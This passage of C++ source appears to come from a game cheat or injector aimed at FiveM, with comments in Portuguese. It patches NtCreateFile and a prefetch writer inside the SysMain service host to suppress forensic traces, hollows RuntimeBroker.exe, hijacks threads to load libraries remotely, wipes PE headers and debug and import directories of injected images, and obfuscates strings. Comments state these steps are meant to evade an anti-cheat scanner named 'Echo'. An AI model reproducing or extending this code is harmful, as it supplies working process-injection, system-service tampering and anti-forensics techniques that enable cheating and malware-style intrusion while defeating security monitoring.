                             sizeof(kPfSvWriteBufferExLegacyPatch)) != 0) ||
                current[12] != 0x74 || current[13] != 0x24)
                return false;

            // The signature exposes the third stack-home displacement.  The
            // first three stores are the usual 8-byte sequence; derive the
            // two overwritten displacements instead of assuming one build's
            // hard-coded prologue.
            const uint8_t thirdOffset = current[14];
            if (thirdOffset < 0x10 || thirdOffset > 0xF8 ||
                (thirdOffset & 7) != 0)
                return false;

            const uint8_t expected[12] = {
                0x48, 0x89, 0x5C, 0x24,
                static_cast<uint8_t>(thirdOffset - 0x10),
                0x48, 0x89, 0x6C, 0x24,
                static_cast<uint8_t>(thirdOffset - 0x08),
                0x48, 0x89
            };
            std::memcpy(original, expected, sizeof(expected));
            return true;
        }

        inline bool InstallPfSvWriteBufferHook(
            uintptr_t sysmainBase,
            WindowsFamily windowsFamily)
        {
            if (!g_hProc || !sysmainBase)
                return false;

            if (windowsFamily == WindowsFamily::Unknown)
            {
                g_lastError = ERROR_OLD_WIN_VERSION;
                return false;
            }

            uintptr_t target = 0;
            bool residualPatch = false;

            if (windowsFamily == WindowsFamily::Windows11)
            {
                target = FindRemotePattern(
                    sysmainBase, kPfSvWriteBufferExWin11Signature);
                if (!target)
                {
                    // Minor Windows 11 servicing updates may preserve the
                    // prologue but change a later instruction.
                    target = FindRemotePattern(
                        sysmainBase, kPfSvWriteBufferExSignature);
                }
            }

            if (!target)
            {
                target = FindRemotePattern(
                    sysmainBase, kPfSvWriteBufferExSignature);
            }

            if (!target)
            {
                target = FindRemotePattern(
                    sysmainBase, kPfSvWriteBufferExBlockedSignature);
                residualPatch = target != 0;
            }

            if (!target)
            {
                target = FindRemotePattern(
                    sysmainBase,
                    kPfSvWriteBufferExBlockedLegacySignature);
                residualPatch = target != 0;
            }

            if (!target)
            {
                g_lastError = ERROR_BAD_EXE_FORMAT;
                return false;
            }

            g_pfPatchAddr = reinterpret_cast<uint8_t*>(target);
            uint8_t current[15]{};
            if (!ReadRemote(g_hProc, target, current, sizeof(current)))
            {
                g_lastError = ERROR_PARTIAL_COPY;
                return false;
            }

            const uint8_t expectedPrefix[12] = {
                0x48, 0x89, 0x5C, 0x24, current[4],
                0x48, 0x89, 0x6C, 0x24, current[9],
                0x48, 0x89
            };
            const bool isBlocked = std::memcmp(
                current, kPfSvWriteBufferExPatch,
                sizeof(kPfSvWriteBufferExPatch)) == 0 ||
                std::memcmp(current, kPfSvWriteBufferExLegacyPatch,
                            sizeof(kPfSvWriteBufferExLegacyPatch)) == 0;
            if (!residualPatch &&
                (current[0] != expectedPrefix[0] ||
                 current[1] != expectedPrefix[1] ||
                 current[2] != expectedPrefix[2] ||
                 current[3] != expectedPrefix[3] ||
                 current[5] != expectedPrefix[5] ||
                 current[6] != expectedPrefix[6] ||
                 current[7] != expectedPrefix[7] ||
                 current[8] != expectedPrefix[8] ||
                 current[10] != expectedPrefix[10] ||
                 current[11] != expectedPrefix[11]))
            {
                g_lastError = ERROR_BAD_EXE_FORMAT;
                return false;
            }

            if (isBlocked)
            {
                if (!ReconstructPfOriginal(current, g_pfOrigBytes))
                {
                    g_lastError = ERROR_BAD_EXE_FORMAT;
                    return false;
                }
                g_pfHooked = true;
                return true;
            }

            std::memcpy(g_pfOrigBytes, current, sizeof(g_pfOrigBytes));
            g_pfHooked = true; // also marks a partial install for rollback
            if (!WriteRemoteBytes(g_pfPatchAddr, kPfSvWriteBufferExPatch,
                                  sizeof(kPfSvWriteBufferExPatch)))
                return false;

            return true;
        }

        inline bool RemovePfSvWriteBufferHook(bool force = false)
        {
            if (!g_pfHooked)
                return true;
            if (!g_hProc || !g_pfPatchAddr)
                return false;

            uint8_t current[12]{};
            if (!ReadRemote(g_hProc,
                            reinterpret_cast<uintptr_t>(g_pfPatchAddr),
                            current, sizeof(current)))
            {
                return RemoteProcessExited();
            }

            if (std::memcmp(current, g_pfOrigBytes,
                            sizeof(g_pfOrigBytes)) == 0)
            {
                g_pfHooked = false;
                g_pfPatchAddr = nullptr;
                return true;
            }

            if (!force &&
                std::memcmp(current, kPfSvWriteBufferExPatch,
                            sizeof(current)) != 0 &&
                std::memcmp(current, kPfSvWriteBufferExLegacyPatch,
                            sizeof(current)) != 0)
            {
                // The module was updated or another owner replaced our
                // bytes.  Never write an old prologue over unknown code.
                g_lastError = ERROR_INVALID_DATA;
                g_pfHooked = false;
                g_pfPatchAddr = nullptr;
                return true;
            }

            if (!WriteRemoteBytes(g_pfPatchAddr, g_pfOrigBytes,
                                  sizeof(g_pfOrigBytes)))
                return false;

            g_pfHooked = false;
            g_pfPatchAddr = nullptr;
            return true;
        }

        inline bool InstallIatHooks(
            uintptr_t sysmainBase,
            WindowsFamily windowsFamily)
        {
            // Do not intercept SysMain's IAT.  Blocking every CreateFileW/
            // WriteFile import was observed to corrupt unrelated SysMain
            // state.  Keep only the signature-located final writer; the
            // validated ntdll syscall patch is installed by Install().
            return InstallPfSvWriteBufferHook(sysmainBase, windowsFamily);
        }

        inline constexpr uint8_t kNtCreateFilePatch[12] = {
            0xB8, 0x22, 0x00, 0x00, 0xC0,
            0xC3,
            0x90, 0x90, 0x90, 0x90, 0x90, 0x90
        };

        inline constexpr std::size_t kNtSyscallProbeSize = 32;

        inline bool LooksLikeNtSyscallStub(const uint8_t* bytes,
                                           std::size_t size)
        {
            if (!bytes || size < 11 || bytes[0] != 0x4C ||
                bytes[1] != 0x8B || bytes[2] != 0xD1 || bytes[3] != 0xB8)
                return false;

            // Windows may insert the CFG/retpoline check between the syscall
            // number and the syscall instruction.  Accept both the compact
            // form (0F 05 C3 at +8) and the guarded form (for example at
            // +18), without depending on a version-specific offset.
            for (std::size_t i = 4; i + 2 < size; ++i)
            {
                if (bytes[i] == 0x0F && bytes[i + 1] == 0x05 &&
                    bytes[i + 2] == 0xC3)
                    return true;
            }
            return false;
        }

        inline bool RestoreNtCreateFileHook(bool force = false)
        {
            if (!g_hooked)
                return true;
            if (!g_hProc || !g_patchAddr)
                return false;

            uint8_t current[12]{};
            if (!ReadRemote(g_hProc,
                            reinterpret_cast<uintptr_t>(g_patchAddr),
                            current, sizeof(current)))
                return RemoteProcessExited();

            if (std::memcmp(current, g_origBytes,
                            sizeof(g_origBytes)) == 0)
                return true;

            if (!force && std::memcmp(current, kNtCreateFilePatch,
                                      sizeof(kNtCreateFilePatch)) != 0)
            {
                // A service-host restart or another component may have
                // replaced the syscall stub.  Do not write stale bytes over
                // an unknown implementation; our patch is no longer the
                // active value.
                return true;
            }

            return WriteRemoteBytes(g_patchAddr, g_origBytes,
                                    sizeof(g_origBytes));
        }

        inline bool HasPendingState()
        {
            return g_hProc || g_patchAddr || g_pfPatchAddr || g_hooked ||
                   g_pfHooked || g_iatPatchCount != 0 ||
                   g_remoteStubCount != 0;
        }

        inline void Remove(bool force = false);

        inline bool Install()
        {
            std::lock_guard<std::recursive_mutex> lock(g_hookStateMutex);

            if (g_hooked) return true;

            if (HasPendingState())
            {
                Remove();
                if (HasPendingState())
                {
                    g_lastError = ERROR_BUSY;
                    return false;
                }
            }

            g_lastError = ERROR_SUCCESS;
            g_targetPid = 0;

            // acha NtCreateFile na ntdll local — mesmo VA no remoto
            void* ntdll = sc::detail::find_module(xorstr("ntdll.dll"));
            if (!ntdll)
            {
                g_lastError = ERROR_MOD_NOT_FOUND;
                return false;
            }

            const WindowsVersion windows = DetectWindowsVersion();
            if (windows.family == WindowsFamily::Unknown)
            {
                g_lastError = ERROR_OLD_WIN_VERSION;
                return false;
            }

            uint8_t* localPatchAddr = static_cast<uint8_t*>(
                sc::detail::find_export(ntdll, sc::djb2_rt(xorstr("NtCreateFile"))));
            if (!localPatchAddr)
            {
                g_lastError = ERROR_PROC_NOT_FOUND;
                return false;
            }

            // acha o svchost do SysMain
            DWORD sysmainPid = GetServiceHostPid(xorstr(L"SysMain"));
            if (!sysmainPid)
                sysmainPid = GetServiceHostPid(xorstr(L"Superfetch"));
            if (!sysmainPid) {
                g_lastError = api::GetLastError_();
                return false;
            }
            g_targetPid = sysmainPid;

            g_hProc = api::OpenProcess_(
                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ |
                    PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
                FALSE, sysmainPid);
            if (!g_hProc) {
                g_lastError = api::GetLastError_();
                return false;
            }

            const uintptr_t localNtdll = reinterpret_cast<uintptr_t>(ntdll);
            const uintptr_t localTarget = reinterpret_cast<uintptr_t>(localPatchAddr);
            g_remoteNtdll = FindRemoteModule(sysmainPid, xorstr(L"ntdll.dll"));
            const uintptr_t remoteSysmain =
                FindRemoteModule(sysmainPid, xorstr(L"sysmain.dll"));
            if (!g_remoteNtdll || !remoteSysmain || localTarget < localNtdll)
            {
                g_lastError = ERROR_MOD_NOT_FOUND;
                api::CloseH(g_hProc);
                ResetHookState();
                return false;
            }

            g_patchAddr = reinterpret_cast<uint8_t*>(
                g_remoteNtdll + (localTarget - localNtdll));

            // salva bytes originais do remoto
            SIZE_T rd = 0;
            const NTSTATUS readStatus = nt::NtReadVirtualMemory_(g_hProc, g_patchAddr,
                g_origBytes, sizeof(g_origBytes), &rd);
            if (!NT_SUCCESS(readStatus) || rd != sizeof(g_origBytes))
            {
                g_lastError = NT_SUCCESS(readStatus) ? ERROR_PARTIAL_COPY : ERROR_ACCESS_DENIED;
                api::CloseH(g_hProc);
                ResetHookState();
                return false;
            }

            uint8_t remoteProbe[kNtSyscallProbeSize]{};
            if (!ReadRemote(g_hProc,
                            reinterpret_cast<uintptr_t>(g_patchAddr),
                            remoteProbe, sizeof(remoteProbe)))
            {
                g_lastError = ERROR_PARTIAL_COPY;
                api::CloseH(g_hProc);
                ResetHookState();
                return false;
            }

            uint8_t localOriginal[kNtSyscallProbeSize]{};
            std::memcpy(localOriginal, localPatchAddr,
                        sizeof(localOriginal));

            // Refuse to patch an address that is not the expected x64 syscall
            // stub.  This prevents a version-specific export layout change
            // from turning the ntdll fallback into a random code patch.
            if (!LooksLikeNtSyscallStub(remoteProbe, sizeof(remoteProbe)) &&
                std::memcmp(g_origBytes, kNtCreateFilePatch,
                            sizeof(kNtCreateFilePatch)) != 0)
            {
                g_lastError = ERROR_BAD_EXE_FORMAT;
                api::CloseH(g_hProc);
                ResetHookState();
                return false;
            }

            if (std::memcmp(g_origBytes, kNtCreateFilePatch,
                            sizeof(kNtCreateFilePatch)) == 0)
            {
                if (!LooksLikeNtSyscallStub(localOriginal,
                                            sizeof(localOriginal)))
                {
                    g_lastError = ERROR_BAD_EXE_FORMAT;
                    api::CloseH(g_hProc);
                    ResetHookState();
                    return false;
                }
                std::memcpy(g_origBytes, localOriginal, sizeof(g_origBytes));
                g_hooked = true;
            }
            else
            {
                g_hooked = true;
                if (!WriteRemoteBytes(g_patchAddr, kNtCreateFilePatch,
                                      sizeof(kNtCreateFilePatch)))
                {
                    Remove(true);
                    return false;
                }
            }

            if (!InstallIatHooks(remoteSysmain, windows.family))
            {
                Remove(true);
                return false;
            }

            g_lastError = ERROR_SUCCESS;

            return g_hooked;
        }

        inline void Remove(bool force)
        {
            std::lock_guard<std::recursive_mutex> lock(g_hookStateMutex);

            if (!HasPendingState())
                return;
            if (!g_hProc)
                return;

            constexpr int kRestoreAttempts = 8;
            for (int attempt = 0; attempt < kRestoreAttempts; ++attempt)
            {
                if (RemoteProcessExited())
                {
                    api::CloseH(g_hProc);
                    ResetHookState();
                    return;
                }

                // Restore the final writer, then the IAT pointers, before
                // restoring ntdll and freeing the temporary stubs.
                const bool pfOk = RemovePfSvWriteBufferHook(force);
                const bool iatOk = RemoveIatHooks(force);
                const bool ntOk = RestoreNtCreateFileHook(force);
                if (pfOk && iatOk && ntOk)
                {
                    api::CloseH(g_hProc);
                    ResetHookState();
                    return;
                }

                if (attempt + 1 < kRestoreAttempts)
                    api::Sleep_(100);
            }

            // Keep every address, original byte array and remote stub alive
            // for a later retry.  Clearing bookkeeping here is what used to
            // leave SysMain patched permanently after a transient failure.
            g_lastError = ERROR_RETRY;
        }
    } // namespace NtCreateFileHook

    inline void WipeWString(std::wstring& s)
    {
        if (!s.empty()) {
            volatile wchar_t* p = &s[0];
            for (std::size_t i = 0; i < s.size(); ++i) p[i] = 0;
        }
        s.clear();
        s.shrink_to_fit();
        std::wstring().swap(s);
    }


    // xorstr() devolve um ponteiro para o buffer interno de um temporario que
    // e zerado pelo destrutor no fim da full expression. Copiar no MESMO
    // statement (dentro desta chamada) evita usar ponteiro ja morto e nao
    // deixa nenhuma copia descriptografada sobrando.
    template <std::size_t N>
    inline void CopyXorToBuffer(wchar_t (&dst)[N], const wchar_t* src) noexcept
    {
        std::size_t i = 0;
        for (; i + 1 < N && src[i]; ++i) dst[i] = src[i];
        dst[i] = L'\0';
        for (i = i + 1; i < N; ++i) dst[i] = L'\0';
    }

    // =========================================================================
    // FiveM target
    // =========================================================================
    inline std::wstring g_fiveMTarget;
    inline std::wstring g_hollowTarget;

    inline std::atomic<DWORD> g_hollowedChildPid{ 0 };

    // =========================================================================
    // Host RuntimeBroker dedicado (Shift+F6) — job mata toda a arvore no Shift+F7.
    // =========================================================================
    inline std::atomic<HANDLE> g_hostKillJob{ nullptr };

    // Alvo do hollowing trocado de FiveM subprocess para RuntimeBroker.exe:
    //   - Echo tem scanners dedicados a FiveM (runFiveMInjectionHostIntegrity,
    //     runFiveMProcessIntegrityScan) que correlacionam host de injecao +
    //     filho hollowed por nome FiveM_b*_GTAProcess.
    //   - RuntimeBroker.exe eh processo legitimo do sistema UWP, Echo nao
    //     entra nele (fora da whitelist de alvos de interesse).
    //   - Nao precisa procurar diretorio, path eh fixo e sempre existe.
    inline std::wstring FindFiveMTarget()
    {
        return std::wstring(xorstr(L"C:\\Windows\\System32\\RuntimeBroker.exe"));
    }

    inline bool InitializeFiveMTarget()
    {
        g_fiveMTarget = FindFiveMTarget();
        return !g_fiveMTarget.empty();
    }

    inline void SetHollowTarget(const wchar_t* target)
    {
        if (target && *target) g_hollowTarget = target;
    }

    // =========================================================================
    // KillOnParentClose
    // =========================================================================
    inline std::atomic<HANDLE> g_killJob{ nullptr };

    inline HANDLE EnsureKillJob()
    {
        HANDLE existing = g_killJob.load(std::memory_order_acquire);
        if (existing && existing != INVALID_HANDLE_VALUE) return existing;

        HANDLE j = api::CreateJobObjectW_(nullptr, nullptr);
        if (!j) return nullptr;

        JOBOBJECT_EXTENDED_LIMIT_INFORMATION info{};
        info.BasicLimitInformation.LimitFlags =
            JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE |
            JOB_OBJECT_LIMIT_BREAKAWAY_OK;
        if (!api::SetInformationJobObject_(j,
                JobObjectExtendedLimitInformation, &info, sizeof(info)))
        { api::CloseH(j); return nullptr; }

        HANDLE expected = nullptr;
        if (!g_killJob.compare_exchange_strong(expected, j))
        { api::CloseH(j); return expected; }
        return j;
    }

    inline bool AttachChildToKillJob(HANDLE child)
    {
        HANDLE j = EnsureKillJob();
        if (!j) return false;
        return api::AssignProcessToJobObject_(j, child) != FALSE;
    }

    // =========================================================================
    // ScrubRemotePEHeaders
    // =========================================================================
    inline void ScrubRemotePEHeaders(HANDLE hProc, PVOID remoteBase,
                                     const IMAGE_NT_HEADERS64* ntHdr)
    {
        if (!hProc || !remoteBase || !ntHdr) return;

        const DWORD headerSize = ntHdr->OptionalHeader.SizeOfHeaders;
        if (headerSize == 0 || headerSize > 0x10000) return;

        auto writeZeros = [&](uintptr_t rva, DWORD sz) {
            if (sz == 0 || sz > 0x100000) return;
            PVOID addr = (PVOID)((uintptr_t)remoteBase + rva);
            DWORD oldProt = 0;
            if (!api::VirtualProtectEx_(hProc, addr, sz, PAGE_EXECUTE_READWRITE, &oldProt))
                return;
            std::vector<uint8_t> zeros(sz, 0);
            SIZE_T w = 0;
            api::WriteProcessMemory_(hProc, addr, zeros.data(), sz, &w);
            DWORD ignored = 0;
            api::VirtualProtectEx_(hProc, addr, sz, oldProt, &ignored);
        };

        // 1) Scrub MZ + PE + section headers (classico - mata private_pe_image)
        writeZeros(0, headerSize);

        // 2) Scrub DEBUG_DIRECTORY → remove PDB path, timestamps, build id.
        //    Echo le isso pra correlacionar binario com build conhecido.
        const auto& dbgDir = ntHdr->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_DEBUG];
        if (dbgDir.VirtualAddress && dbgDir.Size)
            writeZeros(dbgDir.VirtualAddress, dbgDir.Size);

        // 3) Scrub IMPORT descriptor table → remove nomes de kernel32,
        //    ntdll etc. ja resolvidos, nao precisa mais em runtime.
        const auto& impDir = ntHdr->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (impDir.VirtualAddress && impDir.Size)
            writeZeros(impDir.VirtualAddress, impDir.Size);

        // 4) Scrub EXPORT directory (se tiver) — nome do modulo.
        const auto& expDir = ntHdr->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (expDir.VirtualAddress && expDir.Size)
            writeZeros(expDir.VirtualAddress, expDir.Size);

        // 5) Scrub RESOURCE directory (icone, version info com nome do binario).
        const auto& rsrcDir = ntHdr->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_RESOURCE];
        if (rsrcDir.VirtualAddress && rsrcDir.Size)
            writeZeros(rsrcDir.VirtualAddress, rsrcDir.Size);

        // 6) Scrub LOAD_CONFIG (GuardCF stuff com info de build).
        const auto& lcDir = ntHdr->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];
        if (lcDir.VirtualAddress && lcDir.Size)
            writeZeros(lcDir.VirtualAddress, lcDir.Size);
    }

    // =========================================================================
    // QueryRemoteImageBase — read child PEB.ImageBaseAddress
    // =========================================================================
    inline PVOID QueryRemotePebBase(HANDLE hProc)
    {
        using NtQIP = LONG(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        static NtQIP pNtQIP = nullptr;
        if (!pNtQIP)
        {
            HMODULE hNtdll = api::GetModuleHandleW_(xorstr(L"ntdll.dll"));
            pNtQIP = reinterpret_cast<NtQIP>(
                api::GetProcAddr(hNtdll, xorstr("NtQueryInformationProcess")));
        }
        if (!pNtQIP) return nullptr;

        struct PROCESS_BASIC_INFORMATION_ {
            PVOID Reserved1;
            PVOID PebBaseAddress;
            PVOID Reserved2[2];
            ULONG_PTR UniqueProcessId;
            PVOID Reserved3;
        };

        PROCESS_BASIC_INFORMATION_ pbi{};
        ULONG retLen = 0;
        if (pNtQIP(hProc, 0, &pbi, sizeof(pbi), &retLen) < 0) return nullptr;
        return pbi.PebBaseAddress;
    }

    inline PVOID QueryRemoteImageBase(HANDLE hProc)
    {
        PVOID peb = QueryRemotePebBase(hProc);
        if (!peb) return nullptr;

        PVOID imageBase = nullptr;
        SIZE_T rd = 0;
        if (!NT_SUCCESS(nt::NtReadVirtualMemory_(hProc,
            reinterpret_cast<PVOID>(reinterpret_cast<uintptr_t>(peb) + 0x10),
            &imageBase, sizeof(imageBase), &rd)) || !imageBase)
            return nullptr;
        return imageBase;
    }

    inline LONG NtSuspendProcess_(HANDLE hProc)
    {
        using fnNtSuspend = LONG(NTAPI*)(HANDLE);
        static fnNtSuspend pSuspend = reinterpret_cast<fnNtSuspend>(
            sc::Resolve(xorstr("ntdll.dll"), xorstr("NtSuspendProcess")));
        if (!pSuspend) return -1;
        return pSuspend(hProc);
    }

    // =========================================================================
    // Import resolution for the hollowed image.
    //
    // ProcessHollowing maps headers/sections manually; the Windows loader is
    // not invoked for the payload, so the IAT must be resolved by us.  We load
    // each dependency inside the suspended child (CreateRemoteThread ->
    // LoadLibraryW) and write child-side function addresses into the IAT.
    // =========================================================================
    inline SIZE_T LocalVirtualQuery(LPCVOID addr, PMEMORY_BASIC_INFORMATION mbi)
    {
        typedef SIZE_T (WINAPI* fnVQ)(LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);
        static fnVQ pVQ = reinterpret_cast<fnVQ>(
            sc::Resolve(xorstr("kernel32.dll"), xorstr("VirtualQuery")));
        if (!pVQ) return 0;
        return pVQ(addr, mbi, sizeof(*mbi));
    }

    inline uintptr_t FindRemoteModuleBase(DWORD pid, const wchar_t* moduleName)
    {
        if (!pid || !moduleName || !*moduleName) return 0;

        for (int attempt = 0; attempt < 6; ++attempt)
        {
            HANDLE snap = sc::CallCreateToolhelp32Snapshot(
                TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
            if (snap == INVALID_HANDLE_VALUE)
            {
                api::Sleep_(10);
                continue;
            }

            MODULEENTRY32W me{};
            me.dwSize = sizeof(me);
            uintptr_t base = 0;
            if (api::Module32FirstW_(snap, &me))
            {
                do {
                    if (_wcsicmp(me.szModule, moduleName) == 0)
                    {
                        base = reinterpret_cast<uintptr_t>(me.modBaseAddr);
                        break;
                    }
                } while (api::Module32NextW_(snap, &me));
            }
            sc::CallCloseHandle(snap);
            if (base) return base;
            api::Sleep_(10);
        }
        return 0;
    }

    // -------------------------------------------------------------------------
    // Thread hijack for remote LoadLibraryW.
    //
    // Creating a new thread in the hollowed child is both noisy and failed with
    // err=998 while the child was still in its pre-loader-init suspended state.
    // Instead we take an existing non-main thread, point it at the child-side
    // LoadLibraryW, let it return into a tiny "jmp $" stub, then leave it
    // suspended.  The main thread is reserved for the payload entry point.
    // -------------------------------------------------------------------------
    struct RemoteHijackThread
    {
        HANDLE hThread = nullptr;
        DWORD tid = 0;
        bool ownsHandle = false;
        void* remotePage = nullptr;
        uintptr_t doneStub = 0;
        uintptr_t stub = 0;
        uintptr_t flag = 0;
        uintptr_t result = 0;
        uintptr_t childLoadLibraryW = 0;
        uintptr_t childLoadLibraryExW = 0;
        uintptr_t stackTop = 0;
        uintptr_t lastLoaded = 0;
    };

    inline bool InitRemoteHijackThread(HANDLE hProc, DWORD pid, DWORD mainTid,
                                       HANDLE hMainThread,
                                       uintptr_t originalBase, SIZE_T originalSize,
                                       RemoteHijackThread& rt)
    {
        if (!hProc || !hMainThread) return false;

        // RuntimeBroker deixa o loader lock com a main thread durante o
        // init; hijackar um worker fazia LoadLibraryW esperar ~60 s e falhar
        // com NULL. A main e reentrante no loader lock; usa-la resolve isso.
        const bool useMainThread = true;

        uintptr_t chosenRip = 0;
        HANDLE snap = INVALID_HANDLE_VALUE;
        if (!useMainThread)
            snap = sc::CallCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (snap != INVALID_HANDLE_VALUE)
        {
            THREADENTRY32 te{};
            te.dwSize = sizeof(te);
            if (api::Thread32First_(snap, &te))
            {
                do {
                    if (te.th32OwnerProcessID != pid) continue;
                    if (te.th32ThreadID == mainTid) continue;

                    HANDLE h = api::OpenThread_(
                        THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
                        THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION,
                        FALSE, te.th32ThreadID);
                    if (!h) continue;

                    alignas(16) CONTEXT c{};
                    c.ContextFlags = CONTEXT_FULL;
                    if (!api::GetThreadContext_(h, &c))
                    {
                        api::CloseH(h);
                        continue;
                    }

                    const uintptr_t rip = static_cast<uintptr_t>(c.Rip);
                    const bool inOriginal = originalBase && originalSize &&
                        rip >= originalBase && rip < originalBase + originalSize;

                    if (!inOriginal)
                    {
                        rt.hThread = h;
                        rt.tid = te.th32ThreadID;
                        rt.ownsHandle = true;
                        rt.stackTop = static_cast<uintptr_t>(c.Rsp);
                        chosenRip = rip;

                        break;
                    }

                    api::CloseH(h);
                } while (api::Thread32Next_(snap, &te));
            }
            sc::CallCloseHandle(snap);
        }

        if (!rt.hThread)
        {
            alignas(16) CONTEXT c{};
            c.ContextFlags = CONTEXT_FULL;
            if (!api::GetThreadContext_(hMainThread, &c))
            {

                return false;
            }
            rt.hThread = hMainThread;
            rt.tid = mainTid;
            rt.ownsHandle = false;
            rt.stackTop = static_cast<uintptr_t>(c.Rsp);
            chosenRip = static_cast<uintptr_t>(c.Rip);

        }

        if (!rt.stackTop)
        {

            if (rt.ownsHandle && rt.hThread) api::CloseH(rt.hThread);
            rt.hThread = nullptr;
            return false;
        }

        rt.remotePage = api::VirtualAllocEx_(hProc, nullptr, 0x1000,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!rt.remotePage)
        {

            if (rt.ownsHandle && rt.hThread) api::CloseH(rt.hThread);
            rt.hThread = nullptr;
            return false;
        }

        // Done stub em page + 0x800.  LoadLibraryW retorna para ele, que
        // grava o HMODULE em result, depois a flag=1, e entra em jmp $.
        // O HMODULE evita CreateToolhelp32Snapshot(TH32CS_SNAPMODULE) no
        // processo suspenso, que ficava preso esperando o loader do child.
        SIZE_T written = 0;
        const uintptr_t page = reinterpret_cast<uintptr_t>(rt.remotePage);
        rt.flag      = page + 0x700;
        rt.result    = page + 0x708;
        rt.doneStub  = page + 0x800;

        // mov rdx, rax; mov rax, result; mov [rax], rdx;
        // mov rax, flag; mov qword [rax], 1; jmp $
        unsigned char doneCode[35] = {
            0x48,0x89,0xC2,
            0x48,0xB8, 0,0,0,0,0,0,0,0,
            0x48,0x89,0x10,
            0x48,0xB8, 0,0,0,0,0,0,0,0,
            0x48,0xC7,0x00,0x01,0x00,0x00,0x00,
            0xEB,0xFE
        };
        const uint64_t flagAddr   = static_cast<uint64_t>(rt.flag);
        const uint64_t resultAddr = static_cast<uint64_t>(rt.result);
        for (int i = 0; i < 8; ++i) {
            doneCode[5 + i]  = static_cast<unsigned char>((resultAddr >> (8 * i)) & 0xFF);
            doneCode[18 + i] = static_cast<unsigned char>((flagAddr >> (8 * i)) & 0xFF);
        }
        if (!api::WriteProcessMemory_(hProc, reinterpret_cast<PVOID>(rt.doneStub),
                                      doneCode, sizeof(doneCode), &written))
        {

            api::VirtualFreeEx_(hProc, rt.remotePage, 0, MEM_RELEASE);
            rt.remotePage = nullptr;
            if (rt.ownsHandle && rt.hThread) api::CloseH(rt.hThread);
            rt.hThread = nullptr;
            return false;
        }

        HMODULE localK32 = api::GetModuleHandleW_(xorstr(L"kernel32.dll"));
        FARPROC localLoad = api::GetProcAddr(localK32, xorstr("LoadLibraryW"));
        FARPROC localLoadEx = api::GetProcAddr(localK32, xorstr("LoadLibraryExW"));
        uintptr_t childK32 = FindRemoteModuleBase(pid, L"kernel32.dll");
        if (!localK32 || !localLoad || !childK32)
        {

            api::VirtualFreeEx_(hProc, rt.remotePage, 0, MEM_RELEASE);
            rt.remotePage = nullptr;
            if (rt.ownsHandle && rt.hThread) api::CloseH(rt.hThread);
            rt.hThread = nullptr;
            return false;
        }

        rt.childLoadLibraryW = childK32 +
            (reinterpret_cast<uintptr_t>(localLoad) - reinterpret_cast<uintptr_t>(localK32));
        if (localLoadEx)
            rt.childLoadLibraryExW = childK32 +
                (reinterpret_cast<uintptr_t>(localLoadEx) - reinterpret_cast<uintptr_t>(localK32));

        return true;
    }

    inline void CloseRemoteHijackThread(RemoteHijackThread& rt)
    {
        // remotePage is intentionally not freed while the hijacked thread is
        // parked at doneStub; the OS reclaims it when the child exits.
        if (rt.ownsHandle && rt.hThread) api::CloseH(rt.hThread);
        rt.hThread = nullptr;
        rt.tid = 0;
        rt.ownsHandle = false;
        rt.remotePage = nullptr;
        rt.doneStub = 0;
        rt.flag = 0;
        rt.result = 0;
        rt.childLoadLibraryW = 0;
        rt.childLoadLibraryExW = 0;
        rt.stackTop = 0;
        rt.lastLoaded = 0;
    }

    inline bool HijackLoadLibraryW(HANDLE hProc, RemoteHijackThread& rt,
                                   const wchar_t* path, DWORD flags = 0)
    {
        if (!hProc || !rt.hThread || !rt.remotePage || !rt.doneStub ||
            !rt.childLoadLibraryW || !path || !*path)
            return false;
        if (flags && !rt.childLoadLibraryExW) return false;

        rt.lastLoaded = 0;
        const SIZE_T bytes = (wcslen(path) + 1) * sizeof(wchar_t);
        if (bytes == 0 || bytes > 0x300 || rt.stackTop < 0x400) return false;

        SIZE_T written = 0;
        if (!api::WriteProcessMemory_(hProc, rt.remotePage, path, bytes, &written))
        {

            return false;
        }

        uint64_t notDone = 0;
        if (!api::WriteProcessMemory_(hProc, reinterpret_cast<PVOID>(rt.flag),
                                      &notDone, sizeof(notDone), &written))
        {

            return false;
        }

        // LoadLibraryW retorna para doneStub, que grava [flag]=1 e entra em
        // jmp $. A pilha tem o return address no topo.
        uintptr_t sp = (rt.stackTop - 0x200) & ~static_cast<uintptr_t>(0xF);
        sp -= 8;
        if (!api::WriteProcessMemory_(hProc, reinterpret_cast<PVOID>(sp),
                                      &rt.doneStub, sizeof(rt.doneStub), &written))
        {

            return false;
        }

        alignas(16) CONTEXT ctx{};
        ctx.ContextFlags = CONTEXT_FULL;
        if (!api::GetThreadContext_(rt.hThread, &ctx))
        {

            return false;
        }

        ctx.Rip = flags ? rt.childLoadLibraryExW : rt.childLoadLibraryW;
        ctx.Rcx = reinterpret_cast<DWORD64>(rt.remotePage);
        ctx.Rdx = 0;
        ctx.Rsp = sp;
        ctx.Rax = 0;
        ctx.Rbp = 0;
        ctx.R8 = flags;
        ctx.R9 = 0;
        ctx.R10 = 0;
        ctx.R11 = 0;

        if (!api::SetThreadContext_(rt.hThread, &ctx))
        {

            return false;
        }

        // The whole process is suspended by NtSuspendProcess; resume this one
        // thread (and clear any pre-existing suspend count) so it can execute.
        DWORD prev = api::ResumeThread_(rt.hThread);
        if (prev == static_cast<DWORD>(-1))
        {

            return false;
        }
        while (prev > 1)
        {
            prev = api::ResumeThread_(rt.hThread);
            if (prev == static_cast<DWORD>(-1)) return false;
        }

        for (int i = 0; i < 15000; ++i)
        {
            api::Sleep_(2);
            uint64_t done = 0;
            SIZE_T rd = 0;
            if (NT_SUCCESS(nt::NtReadVirtualMemory_(hProc,
